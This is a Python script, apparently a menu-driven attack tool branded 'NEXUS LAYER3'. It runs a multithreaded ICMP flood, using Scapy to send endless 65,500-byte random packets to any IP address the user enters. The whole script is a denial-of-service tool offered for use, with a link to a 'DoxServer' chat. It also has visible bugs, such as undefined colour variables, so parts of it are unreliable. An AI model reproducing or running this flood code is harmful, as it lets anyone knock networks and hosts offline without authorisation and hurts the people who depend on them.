import os
import random
import threading
import time
import sys
from scapy.all import IP, ICMP, send

exile = "\033[38;5;118m"
white = "\033[97m"
red = "\033[38;5;196m"
green = "\033[38;5;34m"
clear = "\033[0m"

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{nexus}
██╗      █████╗ ██╗   ██╗███████╗██████╗     ██████╗ 
██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ╚════██╗
██║     ███████║ ╚████╔╝ █████╗  ██████╔╝     █████╔╝
██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗     ╚═══██╗
███████╗██║  ██║   ██║   ███████╗██║  ██║    ██████╔╝
╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═════╝ {clear}
               
╔═════════════════════════════════════════════════════╗
║ {nexus}*{clear} Github    {nexus}:{clear}   https://github.com/Exileominous     ║
║ {nexus}*{clear} DoxServer {nexus}:{clear}   https://app.revolt.chat/channe/NEXUS║
║ {nexus}*{clear} version   {nexus}:{clear}   1.0                                 ║
║ {nexus}*{clear} NEXUS     {nexus}:{clear}   {nexus}[{clear}{white}LAYER3{clear}{nexus}]{clear}                            ║  
╚═════════════════════════════════════════════════════╝
          
╔═════════════════════════════════════════════════════╗
║ {nexus}[{clear}1{nexus}]{clear} ICMP Flood Attack                               ║                   
║ {nexus}[{clear}3{nexus}]{clear} Exit NEXUS                                      ║                                 
╚═════════════════════════════════════════════════════╝  
""")
    
def layer3():
    while True:
        logo()
        select = input(f"""
╔═══[{nexus}root{clear}@{nexus}NEXUS{clear}]
╚══{nexus}>{clear} """)
                                        
        if select == "1" or select.lower() == "1":
            def send_packet(target):
                try:
                    while True:
                        payload = random._urandom(65500)  
                        packet = IP(dst=target) / ICMP(type=8, chksum=None) / payload

                        send(packet, verbose=False)

                        print(f"[{nexus}NEXUS{clear}] IP Address {nexus}:{clear} {target} {nexus}|{clear} ICMP Packet {nexus}:{clear} {white}65500{clear}")

                except Exception as e:
                    print(f"[{red}WARNING{clear}] Check your permissions or install {nexus}Npcap{clear} : https://npcap.com/#download")
                    time.sleep(2)
                    print(f"{red}......................ERROR......................{clear}")
                    time.sleep(2)

            def start_threads(target, threads):
                thread_list = []

                for i in range(threads):
                    t = threading.Thread(target=send_packet, args=(target,))
                    thread_list.append(t)
                    t.start()

                for t in thread_list:
                    t.join()

            target = input(f"[{nexus}NEXUS{clear}] IP {nexus}>{clear} ")
            threads = int(input(f"[{zoic}NEXUS{clear}] THEREAD {nexus}>{clear} "))

            start_threads(target, threads)
            

        elif select == "3" or select.lower() == "3":
            sys.exit()



if __name__ == "__main__":
    layer3()
